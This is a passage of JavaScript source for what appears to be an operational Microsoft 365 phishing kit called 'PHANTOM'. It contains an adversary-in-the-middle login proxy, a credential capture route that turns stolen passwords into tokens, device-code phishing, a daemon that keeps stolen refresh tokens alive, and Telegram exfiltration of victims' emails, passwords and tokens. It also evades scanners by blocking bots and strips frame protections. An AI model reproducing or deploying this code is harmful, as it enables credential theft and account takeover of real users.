                            const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                            if (idMatch) {
                                const token = decodeURIComponent(idMatch[1]);
                                this.tokens.push({ type: 'id', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                            }
                            const prtMatch = bodyStr.match(/prt=([^&]+)/i);
                            if (prtMatch) {
                                this.tokens.push({ type: 'prt', value: decodeURIComponent(prtMatch[1]), file, username: 'PRT', timestamp: new Date().toISOString() });
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
        return this.tokens;
    }

    getStats() {
        return {
            total: this.tokens.length,
            access: this.tokens.filter(t => t.type === 'access').length,
            refresh: this.tokens.filter(t => t.type === 'refresh').length,
            id: this.tokens.filter(t => t.type === 'id').length,
            prt: this.tokens.filter(t => t.type === 'prt').length
        };
    }

    async healthCheckAll() {
        const results = [];
        const uniqueTokens = [];
        const seen = new Set();
        for (const token of this.tokens) {
            if (!seen.has(token.value) && token.type === 'access') {
                seen.add(token.value);
                uniqueTokens.push(token);
            }
        }
        for (const token of uniqueTokens.slice(0, 10)) {
            try {
                const response = await retry(async () => {
                    return await axios.get('https://graph.microsoft.com/v1.0/me', {
                        headers: { 'Authorization': `Bearer ${token.value}` },
                        timeout: 5000
                    });
                }, 2, 1000, 2);
                results.push({
                    token: token.value.slice(0, 20) + '...',
                    status: 'valid',
                    user: response.data.userPrincipalName,
                    username: token.username
                });
            } catch (e) {
                results.push({
                    token: token.value.slice(0, 20) + '...',
                    status: 'invalid',
                    error: e.message,
                    username: token.username
                });
            }
        }
        return results;
    }

    async exchangeToken(tokenValue) {
        try {
            const response = await retry(async () => {
                return await axios.post(
                    'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                    new URLSearchParams({
                        client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                        refresh_token: tokenValue,
                        grant_type: 'refresh_token',
                        scope: 'https://graph.microsoft.com/.default offline_access'
                    }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
                );
            }, 3, 1000, 2);
            return response.data;
        } catch (err) {
            throw new Error(err.response?.data?.error_description || err.message);
        }
    }
}

const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);

// ============================================================
// 🔄 AUTO-REFRESH DAEMON
// ============================================================
async function refreshTokensDaemon() {
    console.log('🔄 Token Refresh Daemon started (every 30 min)');
    setInterval(async () => {
        for (const flow of deviceFlows) {
            if (flow.refresh_token && flow.status === 'approved') {
                try {
                    const response = await retry(async () => {
                        return await axios.post(
                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: flow.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                                refresh_token: flow.refresh_token,
                                grant_type: 'refresh_token',
                                scope: 'https://graph.microsoft.com/.default offline_access'
                            }),
                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                        );
                    }, 2, 1000, 2);
                    flow.access_token = response.data.access_token;
                    if (response.data.refresh_token) flow.refresh_token = response.data.refresh_token;
                    flow.last_refresh = new Date().toISOString();
                    saveDeviceFlows();
                } catch (e) { console.warn(`Refresh failed: ${e.message}`); }
            }
        }
    }, 30 * 60 * 1000);
}

function loadDeviceFlows() { try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { deviceFlows = JSON.parse(fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8')); } } catch (e) {} }
function saveDeviceFlows() { try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(deviceFlows, null, 2)); } catch (e) {} }
loadDeviceFlows();

function loadPRTStorage() {
    try { if (fs.existsSync(PRT_STORAGE_FILE)) { prtStorage = JSON.parse(fs.readFileSync(PRT_STORAGE_FILE, 'utf-8')); } } catch (e) {}
}
function savePRTStorage() { try { fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(prtStorage, null, 2)); } catch (e) {} }
loadPRTStorage();

class GraphClient {
    constructor(accessToken) {
        this.accessToken = accessToken;
        this.baseUrl = 'https://graph.microsoft.com/v1.0';
        this.cache = global._cache || new CacheManager();
    }
    async get(endpoint, useCache = true) {
        const cacheKey = `graph:get:${endpoint}`;
        if (useCache) {
            const cached = this.cache.get(cacheKey);
            if (cached) return cached;
        }
        const config = getAxiosConfig();
        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
        const response = await retry(async () => {
            return await axios.get(`${this.baseUrl}${endpoint}`, config);
        }, 3, 1000, 2);
        if (useCache && response.status === 200) {
            this.cache.set(cacheKey, response.data, 300000);
        }
        return response.data;
    }
    async post(endpoint, data) {
        const config = getAxiosConfig();
        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
        config.headers['Content-Type'] = 'application/json';
        const response = await retry(async () => {
            return await axios.post(`${this.baseUrl}${endpoint}`, data, config);
        }, 3, 1000, 2);
        return response.data;
    }
    async getUserProfile() {
        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
    }
}

// ============================================================
// 🛡️ DASHBOARD AUTH MIDDLEWARE
// ============================================================
function requireAuth(req, res) {
    const auth = req.headers.authorization;
    if (!auth) {
        res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"' });
        res.end();
        return false;
    }
    const base64 = auth.split(' ')[1];
    const [user, pass] = Buffer.from(base64, 'base64').toString().split(':');
    if (user === DASHBOARD_USER && pass === DASHBOARD_PASS) return true;
    res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"' });
    res.end();
    return false;
}

// ============================================================
// 🔐 ROPC CAPTURE HANDLER (NEW)
// ============================================================
async function handleCapture(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
        try {
            const params = new URLSearchParams(body);
            const email = params.get('email');
            const password = params.get('password');
            if (!email || !password) {
                res.writeHead(400, { 'Content-Type': 'text/html' });
                res.end('<h1>Missing credentials</h1>');
                return;
            }

            const sessionId = generateRandomString(16);
            const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';

            console.log(`🔑 ROPC capture: ${email} (IP: ${ip})`);

            // Send immediate alert
            await sendToTelegram({
                sessionId,
                email,
                password,
                mfa: 'N/A',
                tokens: {},
                cookies: {},
                phishedUrl: 'ROPC Capture'
            }, 'aitm', ip);

            // ROPC token request
            const clientId = '4765445b-32c6-49b0-83e6-1d93765276ca';
            const resource = 'https://www.office.com/v2/OfficeHome.All';
            const tokenUrl = 'https://login.microsoftonline.com/common/oauth2/token';

            const tokenResponse = await axios.post(tokenUrl,
                new URLSearchParams({
                    grant_type: 'password',
                    client_id: clientId,
                    resource: resource,
                    username: email,
                    password: password,
                }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 15000 }
            );

            const tokens = tokenResponse.data;
            if (!tokens.access_token) {
                throw new Error('No access_token in response');
            }

            console.log(`✅ ROPC success for ${email}`);

            // Redirect victim to landing page with token in fragment (stealth)
            const redirectUri = 'https://www.office.com/landingv2';
            const finalUrl = redirectUri + '#access_token=' + encodeURIComponent(tokens.access_token) +
                             '&token_type=' + encodeURIComponent(tokens.token_type) +
                             '&expires_in=' + tokens.expires_in;
            res.writeHead(302, { Location: finalUrl });
            res.end();

            // Send tokens via Telegram
            await sendToTelegram({
                sessionId,
                email,
                password: 'N/A',
                mfa: 'N/A',
                tokens: {
                    access_token: tokens.access_token,
                    refresh_token: tokens.refresh_token,
                    id_token: tokens.id_token
                },
                cookies: {},
                phishedUrl: 'ROPC Success'
            }, 'aitm', ip);

        } catch (error) {
            console.error('ROPC error:', error.response?.data || error.message);
            // If ROPC fails, show a fake error page (keep victim on your domain)
            // You can also try the device code flow as a fallback.
            res.writeHead(400, { 'Content-Type': 'text/html' });
            res.end(`
                <!DOCTYPE html>
                <html>
                <head><title>Sign in</title></head>
                <body>
                    <h1>We couldn't sign you in</h1>
                    <p>Please check your credentials and try again.</p>
                    <a href="/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true">Try again</a>
                </body>
                </html>
            `);
        }
    });
}

// ============================================================
// 🌐 MAIN PROXY SERVER
// ============================================================
const server = http.createServer(async (req, res) => {
    const { method, url } = req;

    // ── 🧹 HEALTH CHECK (no bot blocking) ──
    if (url === '/' || url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'healthy', version: '10.13', uptime: process.uptime(), timestamp: new Date().toISOString() }));
        return;
    }

    // ── 🧪 TEST TELEGRAM (no bot blocking) ──
    if (url === '/test-telegram-now') {
        try {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: '✅ Test from PHANTOM at ' + new Date().toISOString(),
                disable_web_page_preview: true
            });
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('Telegram test sent: ' + JSON.stringify(response.data));
        } catch (e) {
            console.error('Test error:', e.response?.data || e.message);
            res.writeHead(500);
            res.end('Error: ' + (e.response?.data?.description || e.message));
        }
        return;
    }

    // ── 🤖 BOT BLOCKING ──
    // Only block sensitive paths: AiTM entry point, device page, mutation, and proxy endpoints.
    const sensitivePaths = [
        '/device', '/device/',
        PROXY_ENTRY_POINT, // starts with /login?
        PROXY_PATHNAMES.proxy,
        PROXY_PATHNAMES.mutation,
        '/capture'  // ← add capture to block bots
    ];
    const isSensitive = sensitivePaths.some(p => url.startsWith(p)) || url.includes(PHISHED_URL_PARAMETER);
    if (isSensitive && isBot(req.headers['user-agent'])) {
        console.log(`🤖 Blocked bot: ${req.headers['user-agent']} for ${url}`);
        res.writeHead(403, { 'Content-Type': 'text/plain' });
        res.end('Forbidden');
        return;
    }

    // ── 🔥 DEVICE CODE PAGES ──
    if (url === '/device' || url === '/device/') {
        logVisit(req, 'device');

        (async () => {
            try {
                const ip = req.headers['cf-connecting-ip'] || 
                           req.headers['x-real-ip'] || 
                           req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                           'Unknown';
                const country = await getCountryInfo(ip);
                const escapedUrl = escapeMarkdown(req.url);
                const escapedUserAgent = escapeMarkdown(req.headers['user-agent'] || 'Unknown');
                const message = `${country.flag} **Device Page Visit!**\n\n🌍 IP: ${ip} (${country.code})\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${escapedUrl}\n🖥️ User-Agent: ${escapedUserAgent}`;
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                });
                console.log('✅ Device visit notification sent.');
            } catch (e) {
                console.error('❌ Device visit notification failed:', e.message);
                if (e.response) console.error('📛 Telegram API response:', e.response.data);
            }
        })();

        const devicePath = path.join(__dirname, 'public', 'device_code.html');
        if (fs.existsSync(devicePath)) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            fs.createReadStream(devicePath).pipe(res);
        } else {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`<!DOCTYPE html><html><head><title>Device Code</title><meta charset="UTF-8"></head><body style="background:#0a0e17;color:#e0e8f0;font-family:Inter,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;"><div style="background:rgba(255,255,255,0.05);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,0.08);border-radius:24px;padding:40px;text-align:center;max-width:500px;"><h1>📱 Device Code</h1><p>Place <code>public/device_code.html</code> in your repository.</p></div></body></html>`);
        }
        return;
    }

    // ── 🔥 DEVICE CODE API ──
    if (url === '/device/request' && method === 'POST') {
        handleDeviceCodeRequest(req, res);
        return;
    }
    if (url === '/device/token' && method === 'POST') {
        handleDeviceCodeToken(req, res);
        return;
    }

    // ── 🔐 CAPTURE ROUTE (NEW) ──
    if (url === '/capture' && method === 'POST') {
        handleCapture(req, res);
        return;
    }

    // ── 🔥 IFRAME PROXY BYPASS (STRIP X-FRAME-OPTIONS) ──
    // This MUST be placed before the Dashboard and fallback proxyHandler
    if (url.startsWith('/proxy')) {
        const targetUrl = new URL(url, 'http://localhost').searchParams.get('url');
        if (!targetUrl) {
            res.writeHead(400);
            res.end('Missing url parameter');
            return;
        }
        // Use axios to fetch the Microsoft page
        axios.get(targetUrl, {
            responseType: 'arraybuffer',
            headers: {
                'User-Agent': getRandomUserAgent()
            }
        }).then(response => {
            // Strip ALL blocking headers
            const headers = {
                ...response.headers,
                'Content-Type': 'text/html',
                'X-Frame-Options': 'ALLOWALL',
                'Content-Security-Policy': "frame-ancestors 'self' *",
                'Access-Control-Allow-Origin': '*'
            };
            delete headers['x-frame-options'];
            delete headers['content-security-policy'];
            delete headers['frame-ancestors'];

            let html = response.data.toString('utf-8');
            // Inject anti-breakout script to prevent Firefox redirect warning
            const injectScript = `<script>Object.defineProperty(window, 'top', { get: function() { return window; } });</script>`;
            html = html.replace('</head>', injectScript + '</head>');

            res.writeHead(200, headers);
            res.end(Buffer.from(html, 'utf-8'));
        }).catch(err => {
            console.error('🔥 Proxy fetch error:', err.message);
            res.writeHead(500);
            res.end('Failed to fetch target URL');
        });
        return;
    }

    // ── Dashboard HTML ──
    if (url === '/dash' || url === '/dash/') {
        if (!requireAuth(req, res)) return;
        const dashPath = path.join(__dirname, 'public', 'index.html');
        if (fs.existsSync(dashPath)) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            fs.createReadStream(dashPath).pipe(res);
        } else {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`<h1>PHANTOM Dashboard</h1><p>Place public/index.html in the same directory.</p>`);
        }
        return;
    }

    // ── Dashboard API ──
    if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
        if (!requireAuth(req, res)) return;
        await handleDashboardAPI(req, res);
        return;
    }

    // ── Proxy ──
    proxyHandler(req, res);
});

// ============================================================
// 🔥 DEVICE CODE REQUEST HANDLER
// ============================================================
async function handleDeviceCodeRequest(req, res) {
    if (!axios) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'server_error', error_description: 'axios not installed' }));
        return;
    }
    try {
        const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
            new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
        );
        const data = response.data;
        const flow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            client_id: clientId,
            session_id: crypto.randomBytes(16).toString('hex')
        };
        deviceFlows.push(flow);
        saveDeviceFlows();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(data));
    } catch (error) {
        console.error('Device code request error:', error.response?.data || error.message);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
    }
}

async function handleDeviceCodeToken(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
        try {
            const { device_code } = JSON.parse(body);
            if (!device_code) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'invalid_request', error_description: 'device_code required' }));
                return;
            }
            const flow = deviceFlows.find(f => f.device_code === device_code);
            const clientId = flow?.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: clientId,
                    device_code,
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
                }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
            );
            const tokens = response.data;
            if (flow) {
                flow.status = 'approved';
                flow.access_token = tokens.access_token;
                flow.refresh_token = tokens.refresh_token;
                flow.id_token = tokens.id_token;
                flow.approved = new Date().toISOString();
                saveDeviceFlows();

                try {
                    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
                    await sendToTelegram({
                        sessionId: flow.session_id || 'device',
                        email: 'Device Code Flow',
                        password: 'N/A',
                        mfa: 'N/A',
                        tokens: {
                            access_token: tokens.access_token,
                            refresh_token: tokens.refresh_token,
                            id_token: tokens.id_token
                        },
                        cookies: {}
                    }, 'device', ip);
                    console.log('✅ Device token capture notification sent.');
                } catch (e) {
                    console.error('❌ Device token capture notification failed:', e.message);
                }
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(tokens));
        } catch (error) {
            if (error.response?.data?.error === 'authorization_pending') {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'authorization_pending' }));
            } else if (error.response?.data?.error === 'expired_token') {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'expired_token' }));
            } else {
                console.error('Device token error:', error.response?.data || error.message);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
            }
        }
    });
}

// ============================================================
// 🔧 DASHBOARD API HANDLER (FULL – unchanged)
// ============================================================
async function handleDashboardAPI(req, res) {
    const url = req.url;
    const method = req.method;
    const apiPath = url.replace(/^\/api\//, '').replace(/^\/dash\/api\//, '');

    // ── GET /api/stats ──
    if (apiPath === 'stats' && method === 'GET') {
        const stats = vault.getStats();
        const visitCount = fs.existsSync(VISITS_LOG_FILE) ? fs.readFileSync(VISITS_LOG_FILE, 'utf-8').split('\n').filter(l => l.trim()).length : 0;
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            ...stats,
            visits: visitCount,
            deviceFlows: deviceFlows.length,
            prtStorage: prtStorage.prts.length,
            uptime: process.uptime()
        }));
        return;
    }

    // ── GET /api/tokens ──
    if (apiPath === 'tokens' && method === 'GET') {
        const tokens = vault.tokens.map(t => ({ ...t, value: t.value.slice(0, 20) + '...' }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(tokens));
        return;
    }

    // ── POST /api/check-token ──
    if (apiPath === 'check-token' && method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { token } = JSON.parse(body);
                if (!token) {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'token required' }));
                    return;
                }
                const result = await vault.healthCheckAll().then(results => results.find(r => r.token.includes(token.slice(0, 20))));
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(result || { status: 'not_found' }));
            } catch (e) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    // ── GET /api/logs ──
    if (apiPath === 'logs' && method === 'GET') {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const logs = files.map(f => ({
            file: f,
            size: fs.statSync(path.join(LOGS_DIRECTORY, f)).size,
            modified: fs.statSync(path.join(LOGS_DIRECTORY, f)).mtime
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(logs));
        return;
    }

    // ── GET /api/logs/:filename ──
    if (apiPath.startsWith('logs/') && method === 'GET') {
        const filename = apiPath.replace('logs/', '');
        const filePath = path.join(LOGS_DIRECTORY, filename);
        if (!fs.existsSync(filePath)) {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'file not found' }));
            return;
        }
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        fs.createReadStream(filePath).pipe(res);
        return;
    }

    // ── GET /api/visits ──
    if (apiPath === 'visits' && method === 'GET') {
        if (!fs.existsSync(VISITS_LOG_FILE)) {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify([]));
            return;
        }
        const lines = fs.readFileSync(VISITS_LOG_FILE, 'utf-8').split('\n').filter(l => l.trim());
        const visits = lines.map(l => JSON.parse(l));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(visits));
        return;
    }

    // ── GET /api/device-flows ──
    if (apiPath === 'device-flows' && method === 'GET') {
        const safeFlows = deviceFlows.map(f => ({ ...f, access_token: f.access_token ? f.access_token.slice(0, 20) + '...' : null, refresh_token: f.refresh_token ? f.refresh_token.slice(0, 20) + '...' : null }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(safeFlows));
        return;
    }

    // ── GET /api/prt-storage ──
    if (apiPath === 'prt-storage' && method === 'GET') {
        const safe = prtStorage.prts.map(p => ({ ...p, value: p.value ? p.value.slice(0, 20) + '...' : null }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ prts: safe, lastScan: prtStorage.lastScan }));
        return;
    }

    // ── POST /api/refresh-token ──
    if (apiPath === 'refresh-token' && method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { token } = JSON.parse(body);
                if (!token) {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'refresh_token required' }));
                    return;
                }
                const result = await vault.exchangeToken(token);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(result));
            } catch (e) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    // ── Default 404 ──
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'API endpoint not found' }));
}

// ============================================================
// 🔧 PROXY HANDLER
// ============================================================
function proxyHandler(req, res) {
    proxyServer.emit('request', req, res);
}

refreshTokensDaemon();

// ── The actual proxy server ──
const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);
    const clientIp = headers['cf-connecting-ip'] || headers['x-real-ip'] || headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';

    console.log('📥 Incoming URL:', url);

    // ── PAGE‑LOAD NOTIFICATION (Markdown, legacy) ──
    if (url.includes('/login') && url.includes(PHISHED_URL_PARAMETER)) {
        console.log('🔥 ENTRY POINT MATCHED');
        logVisit(clientRequest, 'aitm');
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;
            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = phishedURL.pathname + phishedURL.search;
            VICTIM_SESSIONS[session].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
            VICTIM_SESSIONS[session].host = phishedURL.host;

            const indexPath = path.join(__dirname, PROXY_FILES.index);
            let html = fs.readFileSync(indexPath, 'utf-8');
            const swRegistrationScript = `
<script>
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/service_worker_Mz8XO2ny1Pg5.js')
            .then(() => console.log('✅ SW registered'))
            .catch(err => console.error('❌ SW registration failed:', err));
    }
</script>`;
            html = html.replace(/<\/head>/i, swRegistrationScript + '</head>');

            (async () => {
                try {
                    const country = await getCountryInfo(clientIp);
                    const escapedUrl = escapeMarkdown(url);
                    const escapedUserAgent = escapeMarkdown(headers['user-agent'] || 'Unknown');
                    const message = `${country.flag} **New Visitor (Page Load)!**\n\n🌍 IP: ${clientIp} (${country.code})\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${escapedUrl}\n🖥️ User-Agent: ${escapedUserAgent}`;
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    });
                    console.log('✅ Page-load notification sent (Markdown).');
                } catch (e) {
                    console.error('❌ Page-load notification failed:', e.response?.data || e.message);
                }
            })();

            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            clientResponse.end(html);
            return;
        } catch (error) {
            displayError("Entry point error", error, url);
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
            return;
        }
    }

    // ── SERVICE WORKER ──
    if (url === PROXY_PATHNAMES.serviceWorker) {
        if (!fs.existsSync(swFilePath)) {
            fs.writeFileSync(swFilePath, serviceWorkerCode);
            console.log('✅ Service Worker file created on-the-fly');
        }
        try {
            const swContent = fs.readFileSync(swFilePath, 'utf-8');
            clientResponse.writeHead(200, {
                'Content-Type': 'application/javascript; charset=utf-8',
                'Service-Worker-Allowed': '/',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Content-Length': Buffer.byteLength(swContent)
            });
            clientResponse.end(swContent);
            console.log('✅ Service Worker served successfully');
        } catch (err) {
            console.error('❌ Failed to serve SW:', err.message);
            clientResponse.writeHead(500, { 'Content-Type': 'text/plain' });
            clientResponse.end('// Service Worker Error');
        }
        return;
    }

    // ── Favicon ──
    if (url === PROXY_PATHNAMES.favicon) {
        if (currentSession && VICTIM_SESSIONS[currentSession]) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
        } else {
            clientResponse.writeHead(301, { Location: 'https://login.microsoftonline.com/favicon.ico' });
        }
        clientResponse.end();
        return;
    }

    // ── Proxied requests ──
    if (url === PROXY_PATHNAMES.proxy || currentSession) {
        let clientRequestBody = [];
        clientRequest
            .on("error", (error) => displayError("Client request body retrieval failed", error, method, url))
            .on("data", (chunk) => clientRequestBody.push(chunk))
            .on("end", () => {
                clientRequestBody = Buffer.concat(clientRequestBody).toString();

                if (!currentSession) {
                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
                    clientResponse.end();
                    return;
                }

                let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                const proxyRequestOptions = {
                    hostname: VICTIM_SESSIONS[currentSession].hostname,
                    port: VICTIM_SESSIONS[currentSession].port,
                    method: method,
                    path: VICTIM_SESSIONS[currentSession].path,
                    headers: { ...headers },
                    rejectUnauthorized: false
                };
                let isNavigationRequest = false;

                if (clientRequestBody) {
                    if (url === PROXY_PATHNAMES.jsCookie) {
                        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                        const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                        clientResponse.writeHead(200, { "Content-Type": "application/json" });
                        clientResponse.end(JSON.stringify(validDomains));
                        return;
                    } else if (url === PROXY_PATHNAMES.proxy) {
                        try {
                            const parsed = JSON.parse(clientRequestBody);
                            let proxyRequestURL = new URL(parsed.url);
                            let proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;

                            if (proxyRequestURL.hostname === headers.host) {
                                if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                    const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
                                    VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                    VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                    VICTIM_SESSIONS[currentSession].path = phishedURL.pathname + phishedURL.search;
                                    VICTIM_SESSIONS[currentSession].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
                                    VICTIM_SESSIONS[currentSession].host = phishedURL.host;
                                    clientResponse.writeHead(301, { Location: `${phishedURL.protocol}//${headers.host}${phishedURL.pathname}${phishedURL.search}` });
                                    clientResponse.end();
                                    return;
                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                    clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                                    fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                    return;
                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                    try {
                                        const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                        proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                        proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
                                        // 🔥 FIX: Update session to match the real Microsoft URL
                                        VICTIM_SESSIONS[currentSession].protocol = proxyRequestURL.protocol;
                                        VICTIM_SESSIONS[currentSession].hostname = proxyRequestURL.hostname;
                                        VICTIM_SESSIONS[currentSession].path = proxyRequestPath;
                                        VICTIM_SESSIONS[currentSession].port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
                                        VICTIM_SESSIONS[currentSession].host = proxyRequestURL.host;
                                        // Debug log
                                        const cookieHeader = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
                                        console.log('🍪 Mutation cookies for session', currentSession, ':', cookieHeader);
                                    } catch (error) {
                                        displayError("Mutation parse failed", error, proxyRequestPath);
                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                        return;
                                    }
                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
